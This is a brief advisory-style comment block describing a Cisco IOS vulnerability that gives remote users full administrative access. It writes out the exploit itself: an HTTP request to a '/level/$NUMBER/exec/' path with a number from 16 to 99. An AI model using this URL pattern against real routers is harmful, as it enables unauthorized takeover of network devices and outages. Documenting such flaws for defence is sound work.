# IOS is router firmware developed and distributed by Cisco Systems. IOS functions on numerous Cisco devices, including routers and switches.
#
# It is possible to gain full remote administrative access on devices using affected releases of IOS. By using a URL of http://router.address/level/$NUMBER/exec/.... where $NUMBER is an integer between 16 and 99, it is possible for a remote user to gain full administrative access.
#
# This problem makes it possible for a remote user to gain full administrative privileges, which may lead to further compromise of the network or result in a denial of service.
